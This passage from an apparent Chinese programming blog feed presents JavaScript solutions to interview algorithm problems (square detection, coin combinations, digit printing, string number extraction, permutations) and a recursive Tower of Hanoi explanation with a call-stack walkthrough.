</span>&#123; </div><div class="line">          <span class="keyword">var</span> dists = []; <span class="comment">//用来存放四边形任意两点之间的距离</span></div><div class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</div><div class="line">              <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; <span class="number">4</span>; j++) &#123;</div><div class="line">                  <span class="keyword">var</span> dist = distance(x[i], y[i], x[j], y[j]);</div><div class="line">                  dists.push(dist);</div><div class="line">              &#125;</div><div class="line">          &#125;</div><div class="line">          dists = dists.sort();</div><div class="line">          <span class="keyword">if</span> (dists[<span class="number">0</span>] === dists[<span class="number">1</span>] &amp;&amp; dists[<span class="number">1</span>] === dists[<span class="number">2</span>] &amp;&amp; dists[<span class="number">2</span>] === dists[<span class="number">3</span>] &amp;&amp; dists[<span class="number">4</span>] === dists[<span class="number">5</span>]) &#123;</div><div class="line">              <span class="built_in">console</span>.log(<span class="string">'Yes, this is a square!'</span>);</div><div class="line">          &#125;</div><div class="line"></div><div class="line">      &#125;</div><div class="line"></div><div class="line"><span class="comment">// distance表示两点之间距离的平方</span></div><div class="line">      <span class="function"><span class="keyword">function</span> <span class="title">distance</span>(<span class="params">x1, y1, x2, y2</span>) </span>&#123; <span class="comment">//参数x1,y1和x2,y2分别表示两个点的横纵坐标</span></div><div class="line">          <span class="keyword">var</span> distance = <span class="built_in">Math</span>.pow(x1 - x2, <span class="number">2</span>) + <span class="built_in">Math</span>.pow(y1 - y2, <span class="number">2</span>);</div><div class="line">          <span class="keyword">return</span> distance;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">var</span> xArr = [<span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>];</div><div class="line">      <span class="keyword">var</span> yArr = [<span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>];</div><div class="line">      judgeSquare(xArr, yArr); <span class="comment">//Yes, this is a square!</span></div></pre></td></tr></table></figure>
<h3 id="2-k面值的n组合问题"><a href="#2-k面值的n组合问题" class="headerlink" title="2^k面值的n组合问题"></a>2^k面值的n组合问题</h3><p>问题描述：（记不清了，大概是这样,k和n的上限也记不得了，只记录下实现思路）有面值分别为2^k的硬币各2枚(k&gt;=0，且k为整数)，现在要买n元的东西，问有多少种不同的硬币组合方式？</p>
<p>思路：从最小面额的开始考虑，</p>
<p>(1)如果给出的n元是偶数，那么又分为花掉面额为1的(如果花掉面额为1的肯定是花掉2个)，和不花掉面额为1的。</p>
<p>如果花掉两个面额为1的，那么问题的规模就缩小为求n-2的组合情况(即n-2要用2，4，8…来组合，因为此时1已经用光了)，又因为n-2也是个偶数，所以可以对半分，即(n-2)/2用1，2，4，8…来组合，可以用递归了。</p>
<p>如果不花掉面额为1的，那么从面额2开始花起，又n为偶数，所以问题的规模可以对半分为，求n/2用 1，2，4，8…来组合，可以用递归了。</p>
<p>(2)如果给出的n元是奇数，那么肯定要花掉一个面额为1的，那么n-1是个偶数，此时已经不能再花面额为1的了，即n是奇数的时候只能花掉一个面额为1的，所以问题规模就变成了n-1用面额为2，4，8…来组合，即问题规模折半为(n-1)/2用1，2，4，8…来组合，可以用递归了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">combination</span>(<span class="params">n</span>) </span>&#123;</div><div class="line">    <span class="comment">// 初始条件</span></div><div class="line">    <span class="comment">// if (n === 1) &#123;</span></div><div class="line">    <span class="comment">//     return 1;</span></div><div class="line">    <span class="comment">// &#125;</span></div><div class="line">    <span class="comment">// if (n === 2) &#123;</span></div><div class="line">    <span class="comment">//     return 2;</span></div><div class="line">    <span class="comment">// &#125;</span></div><div class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">2</span>) &#123;</div><div class="line">        <span class="keyword">return</span> n;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// 先判断n的奇偶性</span></div><div class="line">    <span class="keyword">if</span> (n % <span class="number">2</span> === <span class="number">0</span>) &#123; <span class="comment">//n为偶数</span></div><div class="line">        <span class="keyword">return</span> combination((n - <span class="number">2</span>) / <span class="number">2</span>) + combination(n / <span class="number">2</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> combination((n - <span class="number">1</span>) / <span class="number">2</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">combination(<span class="number">12</span>); <span class="comment">//5</span></div></pre></td></tr></table></figure>
<h3 id="头条：-打印一行数字的字符串形式"><a href="#头条：-打印一行数字的字符串形式" class="headerlink" title="头条： 打印一行数字的字符串形式"></a>头条： 打印一行数字的字符串形式</h3><p>思路：将0-9的数字的打印形式保存成一个二维数组，例如num[0]中保存了数字0一到第五行的打印字符串形式，然后一行一行的打印（总共打印五行，因为每个数字用五行字符串描述），每一行由给出的数组中的数字的第i行的字符串形式拼接起来再打印。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">   <span class="comment">//将0-9的数字的打印形式保存成一个二维数组，例如num[0]中保存了数字0一到第五行的打印字符串形式</span></div><div class="line">   <span class="keyword">var</span> num = [[<span class="string">'66666'</span>, <span class="string">'6...6'</span>, <span class="string">'6...6'</span>, <span class="string">'6...6'</span>, <span class="string">'66666'</span>],</div><div class="line">              [<span class="string">'....6'</span>, <span class="string">'....6'</span>, <span class="string">'....6'</span>, <span class="string">'....6'</span>, <span class="string">'....6'</span>],</div><div class="line">              [<span class="string">'66666'</span>, <span class="string">'....6'</span>, <span class="string">'66666'</span>, <span class="string">'6....'</span>, <span class="string">'66666'</span>],</div><div class="line">              [<span class="string">'66666'</span>, <span class="string">'....6'</span>, <span class="string">'66666'</span>, <span class="string">'....6'</span>, <span class="string">'66666'</span>],</div><div class="line">              [<span class="string">'6...6'</span>, <span class="string">'6...6'</span>, <span class="string">'66666'</span>, <span class="string">'....6'</span>, <span class="string">'....6'</span>],</div><div class="line">              [<span class="string">'66666'</span>, <span class="string">'6....'</span>, <span class="string">'66666'</span>, <span class="string">'....6'</span>, <span class="string">'66666'</span>],</div><div class="line">              [<span class="string">'66666'</span>, <span class="string">'6....'</span>, <span class="string">'66666'</span>, <span class="string">'6...6'</span>, <span class="string">'66666'</span>],</div><div class="line">              [<span class="string">'66666'</span>, <span class="string">'....6'</span>, <span class="string">'....6'</span>, <span class="string">'....6'</span>, <span class="string">'....6'</span>],</div><div class="line">              [<span class="string">'66666'</span>, <span class="string">'6...6'</span>, <span class="string">'66666'</span>, <span class="string">'6...6'</span>, <span class="string">'66666'</span>],</div><div class="line">              [<span class="string">'66666'</span>, <span class="string">'6...6'</span>, <span class="string">'66666'</span>, <span class="string">'....6'</span>, <span class="string">'66666'</span>]];</div><div class="line">   <span class="keyword">var</span> numArr = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]; <span class="comment">//测试数组</span></div><div class="line">   <span class="comment">// 一行一行的打印，每个数字用五行表示，每两个数字之间用两个点点分隔开</span></div><div class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i ++) &#123;</div><div class="line">       <span class="keyword">var</span> resultStr = <span class="string">''</span>; <span class="comment">//保存每一行结果的字符串</span></div><div class="line">       <span class="comment">// 将第numArr中的numArr.length个数字的第i行拼接起来并打印</span></div><div class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; numArr.length; j ++) &#123;</div><div class="line">           resultStr += num[numArr[j]][i] + <span class="string">'..'</span>;</div><div class="line">       &#125;</div><div class="line">       <span class="comment">// 每一行最后会多两个点点，截取掉</span></div><div class="line">       <span class="keyword">var</span> len = resultStr.length - <span class="number">2</span>;</div><div class="line">       <span class="built_in">console</span>.log(resultStr.substring(<span class="number">0</span>, len));</div><div class="line">   &#125;</div><div class="line"><span class="comment">//打印结果</span></div><div class="line"><span class="number">66666.</span>....<span class="number">.6</span>.<span class="number">.66666</span>.<span class="number">.66666</span>.<span class="number">.6</span>..<span class="number">.6</span>.<span class="number">.66666</span>.<span class="number">.66666</span>.<span class="number">.66666</span>.<span class="number">.66666</span>.<span class="number">.66666</span></div><div class="line"><span class="number">6.</span>.<span class="number">.6</span>.....<span class="number">.6</span>.....<span class="number">.6</span>.....<span class="number">.6</span>.<span class="number">.6</span>..<span class="number">.6</span>.<span class="number">.6</span>.....<span class="number">.6</span>.........<span class="number">.6</span>.<span class="number">.6</span>..<span class="number">.6</span>.<span class="number">.6</span>..<span class="number">.6</span></div><div class="line"><span class="number">6.</span>.<span class="number">.6</span>.....<span class="number">.6</span>.<span class="number">.66666</span>.<span class="number">.66666</span>.<span class="number">.66666</span>.<span class="number">.66666</span>.<span class="number">.66666</span>.....<span class="number">.6</span>.<span class="number">.66666</span>.<span class="number">.66666</span></div><div class="line"><span class="number">6.</span>.<span class="number">.6</span>.....<span class="number">.6</span>.<span class="number">.6</span>.........<span class="number">.6</span>.....<span class="number">.6</span>.....<span class="number">.6</span>.<span class="number">.6</span>..<span class="number">.6</span>.....<span class="number">.6</span>.<span class="number">.6</span>..<span class="number">.6</span>.....<span class="number">.6</span></div><div class="line"><span class="number">66666.</span>....<span class="number">.6</span>.<span class="number">.66666</span>.<span class="number">.66666</span>.....<span class="number">.6</span>.<span class="number">.66666</span>.<span class="number">.66666</span>.....<span class="number">.6</span>.<span class="number">.66666</span>.<span class="number">.66666</span></div></pre></td></tr></table></figure>
<h3 id="百词斩：-找一个字符串中包含的最大数"><a href="#百词斩：-找一个字符串中包含的最大数" class="headerlink" title="百词斩： 找一个字符串中包含的最大数"></a>百词斩： 找一个字符串中包含的最大数</h3><p>问题描述： 给出一个字符串，例如<code>&#39;helloworld520helloworld1314&#39;</code>，找出字符串中包含的最大数字，即输出为<code>1314</code>。</p>
<p>思路：利用正则表达式，先把字符串中的连续数字子串提取出来放到数组中，然后再求这个数字字符串数组中的最大数字。</p>
<p>注意：正则表达式的全局标志<code>g</code>一定要加上，不然只会找到第一个匹配。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">searchMaxNum</span>(<span class="params">str</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> reg = <span class="regexp">/([0-9]+)/g</span>; <span class="comment">//正则表达式，匹配字符串中的连续数字子串，并使用String的match方法将捕获组返回至numArr数组中</span></div><div class="line">    <span class="keyword">var</span> numArr = string.match(reg); <span class="comment">//numArr中的元素类型为字符串，即numAr为数字字符串数组</span></div><div class="line">    <span class="keyword">var</span> maxNum = numArr[<span class="number">0</span>] - <span class="number">0</span>; <span class="comment">//将数字字符串转换为数值类型</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; numArr.length; i ++) &#123; <span class="comment">//找出numArr数字字符串数组中的最大值</span></div><div class="line">        <span class="keyword">var</span> tempNum = numArr[i] - <span class="number">0</span>;</div><div class="line">        <span class="keyword">if</span> (tempNum &gt;= maxNum) &#123;</div><div class="line">            maxNum = tempNum;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">console</span>.log(maxNum);</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> string = <span class="string">'helloworld520helloworld1314'</span>;</div><div class="line">searchMaxNum(string); <span class="comment">//返回 1314</span></div></pre></td></tr></table></figure>
<h3 id="百词斩-压缩连续数字1-7"><a href="#百词斩-压缩连续数字1-7" class="headerlink" title="百词斩: 压缩连续数字1-7"></a>百词斩: 压缩连续数字1-7</h3><p>问题描述： 给出一个由数字1-7组成的有序数字字符串(分别代表星期一~星期天)，若这个数字字符串有三个或三个以上连续的数字，例如<code>234</code>，则返回其压缩形式<code>2-4</code>(由该段连续数字的首尾中间加一根短横线组成)，若连续的数字长度小于等于二，则将该数字直接返回就好，不用压缩。</p>
<p>例如给定输入 <code>124567</code>，则输出为<code>1,2,4-7</code>。 若给定输入<code>12</code>，则输出为<code>1,2</code>。</p>
<p>思路：(1)如果给定的字符串长度小于等于2，则直接在这段字符串中间加一个逗号 <code>,</code>返回即可。</p>
<p>(2)若给定的字符串长度大于2，先将数字字符串转化为数字数组，再将该数组中连续的数字提取出来放到一个二维数组中，再将数组中字符串元素处理拼接。即判断该二维数组中元素的长度，若数组中元素的长度小于2，则直接加逗号拼接，若元素长度大于2，则写成压缩形式(用该元素的首尾再加短横线)拼接。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">compressStr</span>(<span class="params">str</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> resultStr = <span class="string">''</span>; <span class="comment">//压缩后的字符串，即输出结果</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> (str.length &lt;= <span class="number">2</span>) &#123; <span class="comment">//如果输入字符串长度&lt;=2，则直接中间加逗号返回</span></div><div class="line">            resultStr = str.split(<span class="string">""</span>).join(<span class="string">","</span>);</div><div class="line">            <span class="built_in">console</span>.log(resultStr);</div><div class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">//输入字符串长度&gt;=3</span></div><div class="line">            <span class="comment">// 先将数字字符串转化为数值类型并存进数组</span></div><div class="line">            <span class="keyword">var</span> numArr = [];</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i ++) &#123;</div><div class="line">                numArr.push(str[i] - <span class="number">0</span>);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="comment">// 将数组numArr中的连续数字提取出来放进一个二维数组</span></div><div class="line">            <span class="keyword">var</span> twoDimArr = extractContinuity(numArr);</div><div class="line"></div><div class="line">            <span class="comment">// 处理二维数组twoDimArr</span></div><div class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; twoDimArr.length; i ++) &#123;</div><div class="line">                <span class="keyword">var</span> len = twoDimArr[i].length; <span class="comment">//二维数组元素的长度</span></div><div class="line">                <span class="keyword">if</span> (len &lt;= <span class="number">2</span>) &#123;</div><div class="line">                    resultStr = resultStr + twoDimArr[i].join(<span class="string">','</span>) + <span class="string">','</span>;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    resultStr = resultStr + twoDimArr[i][<span class="number">0</span>] + <span class="string">'-'</span> + twoDimArr[i][len<span class="number">-1</span>] + <span class="string">','</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            resultStr = resultStr.substring(<span class="number">0</span>, resultStr.length - <span class="number">1</span>); <span class="comment">//去掉最后多出的一个逗号</span></div><div class="line">            <span class="built_in">console</span>.log(resultStr);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 判断一个数组的数字是否连续，将连续的数字提取出来转化为一个二维数组</span></div><div class="line">    <span class="comment">// 例如[3, 4, 13 ,14, 15, 17, 20, 22] 转化为 [[3,4],[13,14,15],[17],[20],[22]]</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extractContinuity</span>(<span class="params">arr</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> result = [];</div><div class="line">        <span class="keyword">var</span> temp;</div><div class="line">        <span class="keyword">while</span> (temp = arr.shift()) &#123;</div><div class="line">            <span class="keyword">if</span> (result.length === <span class="number">0</span>) &#123; <span class="comment">//如果二维数组为空，则直接将arr的第一个数字push进该二维数组</span></div><div class="line">                result.push([temp]);</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">var</span> element = result[result.length - <span class="number">1</span>]; <span class="comment">//二维数组中的最后一个元素</span></div><div class="line">            <span class="keyword">if</span> (temp === element[element.length - <span class="number">1</span>] + <span class="number">1</span>) &#123;</div><div class="line">                element.push(temp);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                result.push([temp]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> result;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> string = <span class="string">'12367'</span>;</div><div class="line">    compressStr(string); <span class="comment">//输出 '1-3,6,7'</span></div></pre></td></tr></table></figure>
<h3 id="百词斩：-给出一组数字的从小到大的全排列形式"><a href="#百词斩：-给出一组数字的从小到大的全排列形式" class="headerlink" title="百词斩： 给出一组数字的从小到大的全排列形式"></a>百词斩： 给出一组数字的从小到大的全排列形式</h3><p>问题描述：给出一个数字数组，数组里的数字各不相同，例如[3, 1, 5],给出这几个数字的全排列并按从小到大的形式输出，即输出为 135,153,315,351,513,531。</p>
<p>思路：从数组的数字里面任意选一个，放在第一项,然后将剩下的数字递归全排。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fullSort</span>(<span class="params">arr</span>)  </span>&#123;</div><div class="line">    <span class="keyword">var</span> arr = arr.sort(); <span class="comment">//先将数组排序</span></div><div class="line">    <span class="keyword">var</span> result = [];</div><div class="line">    <span class="keyword">if</span> (arr.length === <span class="number">1</span>) &#123;</div><div class="line">        result.push(arr);</div><div class="line">        <span class="keyword">return</span> result;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i ++) &#123;</div><div class="line">        <span class="keyword">var</span> temp = [];</div><div class="line">        temp.push(arr[i]); <span class="comment">//取arr的任意一项放到temp的第一项</span></div><div class="line"></div><div class="line">        <span class="keyword">var</span> remain = arr.slice(<span class="number">0</span>); <span class="comment">//深复制原数组到remain</span></div><div class="line">        remain.splice(i, <span class="number">1</span>); <span class="comment">//去掉temp中的那一项</span></div><div class="line"></div><div class="line">        <span class="keyword">var</span> temp2 = fullSort(remain).concat(); <span class="comment">//将剩下的项全排列，返回[[3,5],[5,3]]这样的数据</span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; temp2.length; j ++) &#123;</div><div class="line">            temp2[j].unshift(temp[<span class="number">0</span>]); <span class="comment">//得到[[1,3,5],[1,5,3]]这样的数据</span></div><div class="line">            result.push(temp2[j]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> arr = [<span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>];</div><div class="line"><span class="keyword">var</span> resultArr = fullSort(arr);</div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; resultArr.length; i ++) &#123;</div><div class="line">    <span class="keyword">var</span> num = resultArr[i].join(<span class="string">""</span>) - <span class="number">0</span>;</div><div class="line">    <span class="built_in">console</span>.log(num);</div><div class="line">&#125;</div><div class="line"><span class="comment">//输出结果</span></div><div class="line"><span class="number">135</span></div><div class="line"><span class="number">153</span></div><div class="line"><span class="number">315</span></div><div class="line"><span class="number">351</span></div><div class="line"><span class="number">513</span></div><div class="line"><span class="number">531</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2018春季腾讯研发岗在线模拟笔试算法题目总结。&lt;br&gt;
    
    </summary>
    
      <category term="js算法题" scheme="http://yoursite.com/categories/js%E7%AE%97%E6%B3%95%E9%A2%98/"/>
    
    
      <category term="js算法题" scheme="http://yoursite.com/tags/js%E7%AE%97%E6%B3%95%E9%A2%98/"/>
    
      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>汉诺塔递归算法JS实现</title>
    <link href="http://yoursite.com/2018/03/13/%E6%B1%89%E8%AF%BA%E5%A1%94%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95JS%E5%AE%9E%E7%8E%B0/"/>
    <id>http://yoursite.com/2018/03/13/汉诺塔递归算法JS实现/</id>
    <published>2018-03-13T03:25:25.000Z</published>
    <updated>2018-03-13T06:05:45.270Z</updated>
    
    <content type="html"><![CDATA[<p>递归把一组问题分解为一组相似的子问题，每一个问题都用一个寻常解去解决。递归函数就是会直接或者间接调用自身的一种函数，一般来说，一个递归函数调用自身去解决它的子问题。在自己这个函数里有调用自己这个函数的语句，而这个调用怎么才能调用结束呢？，这里还必须有一个结束点，或者具体的说是在调用到某一次后函数能返回一个确定的值，接着倒数第二个就能返回一个确定的值，一直到第一次调用的这个函数能返回一个确定的值。<br><a id="more"></a></p>
<h2 id="“汉诺塔问题”描述"><a href="#“汉诺塔问题”描述" class="headerlink" title="“汉诺塔问题”描述"></a>“汉诺塔问题”描述</h2><p>塔上有三根柱子和一套直径各不相同的空心圆盘，开始时源柱子上的所有圆盘都按从大到小的顺序排列。目标是通过每一次移动一个圆盘到另一根柱子上，最终把一堆圆盘移动到目标柱子上，过程中不允许把较大的圆盘放置在较小的圆盘上；</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/demo/%E6%B1%89%E8%AF%BA%E5%A1%94%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95JS%E5%AE%9E%E7%8E%B0/images/%E6%B1%89%E8%AF%BA%E5%A1%94%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="汉诺塔示意图"><br>当n=3时的移动如下：</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/demo/%E6%B1%89%E8%AF%BA%E5%A1%94%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95JS%E5%AE%9E%E7%8E%B0/images/n=3%E6%97%B6%E7%9A%84%E6%B1%89%E8%AF%BA%E5%A1%94%E9%97%AE%E9%A2%98.gif" alt="n=3时的汉诺塔问题"></p>
<p>把所有圆盘(n个)从A(src)移动到C(dst)。</p>
<p>(1) 当n=1时<br>第一次：1号 A -&gt; C</p>
<p>(2) 当n=2时<br>第一次： 1号 A -&gt; B<br>第二次:  2号 A -&gt; C<br>第三次： 1号 B -&gt; C</p>
<p>(3) 当n=3时<br>第一次： 1号 A -&gt; C<br>第二次： 2号 A -&gt; B<br>第三次： 1号 C -&gt; B<br>第四次： 3号 A -&gt; C<br>第五次： 1号 B -&gt; A<br>第六次： 2号 B -&gt; C<br>第七次： 1号 A -&gt; C</p>
<p>可发现移动次数与n的关系为：2^n - 1</p>
<h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>实现这个算法可以简单分为三个步骤：<br>(1)把A上的 n-1 个圆盘借助辅助塔(C塔)由A移到B;<br>(2)把 n号(即最大的那个)由A移到C；<br>(3)把B上的 n-1 个圆盘借助辅助塔(A塔)由B移到C；</p>
<h2 id="javascript实现"><a href="#javascript实现" class="headerlink" title="javascript实现"></a>javascript实现</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// js语言精粹 4.8递归 汉诺塔问题</span></div><div class="line"><span class="keyword">var</span> times = <span class="number">0</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">hanoi</span>(<span class="params">n, src, aux, dist</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (n &gt; <span class="number">0</span>) &#123;</div><div class="line">        hanoi(n - <span class="number">1</span>, src, dist, aux); <span class="comment">//递归，把A(src)塔上编号1~n-1的圆盘移到B(aux)上，以C(dist)为辅助塔</span></div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"第"</span> + (++times) + <span class="string">"次移动："</span> + n + <span class="string">"号盘从"</span> + src + <span class="string">"移到"</span> + dist); <span class="comment">//把A塔上编号为n的圆盘移到C上</span></div><div class="line">        hanoi(n - <span class="number">1</span>, aux, src, dist); <span class="comment">//递归，把B塔上编号1~n-1的圆盘移到C上，以A为辅助塔</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">hanoi(<span class="number">3</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>);</div><div class="line"><span class="comment">//运行结果</span></div><div class="line">第<span class="number">1</span>次移动：<span class="number">1</span>号盘从A移到C</div><div class="line">第<span class="number">2</span>次移动：<span class="number">2</span>号盘从A移到B</div><div class="line">第<span class="number">3</span>次移动：<span class="number">1</span>号盘从C移到B</div><div class="line">第<span class="number">4</span>次移动：<span class="number">3</span>号盘从A移到C</div><div class="line">第<span class="number">5</span>次移动：<span class="number">1</span>号盘从B移到A</div><div class="line">第<span class="number">6</span>次移动：<span class="number">2</span>号盘从B移到C</div><div class="line">第<span class="number">7</span>次移动：<span class="number">1</span>号盘从A移到C</div></pre></td></tr></table></figure>
<h2 id="调用方法的栈机制"><a href="#调用方法的栈机制" class="headerlink" title="调用方法的栈机制"></a>调用方法的栈机制</h2><p>从主线程开始调用方法（函数）进行不停的压栈和出栈操作，函数的调用就是将函数压如栈中，函数的结束就是函数出栈的过程，这样就保证了方法调用的顺序流，即当函数出现多层嵌套时，需要从外到内一层层把函数压入栈中，最后栈顶的函数先执行结束（最内层的函数先执行结束）后出栈，再倒数第二层的函数执行结束出栈，到最后，第一个进栈的函数调用结束后从栈中弹出回到主线程，并且结束。</p>
<h2 id="图解程序运行流程"><a href="#图解程序运行流程" class="headerlink" title="图解程序运行流程"></a>图解程序运行流程</h2><p>(1)函数hanoi(n, A, B, C)的功能是把编号为n的圆盘借助B从A移到C上；<br>(2)函数move(n, M, N)的功能是把编号为n的圆盘从M移到N上；</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/demo/%E6%B1%89%E8%AF%BA%E5%A1%94%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95JS%E5%AE%9E%E7%8E%B0/images/%E6%B1%89%E8%AF%BA%E5%A1%94%E9%97%AE%E9%A2%98n=3%E6%97%B6%E7%9A%84%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B.png" alt="汉诺塔问题n=3时的运行流程"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;递归把一组问题分解为一组相似的子问题，每一个问题都用一个寻常解去解决。递归函数就是会直接或者间接调用自身的一种函数，一般来说，一个递归函数调用自身去解决它的子问题。在自己这个函数里有调用自己这个函数的语句，而这个调用怎么才能调用结束呢？，这里还必须有一个结束点，或者具体的说是在调用到某一次后函数能返回一个确定的值，接着倒数第二个就能返回一个确定的值，一直到第一次调用的这个函数能返回一个确定的值。&lt;br&gt;
    
    </summary>
    
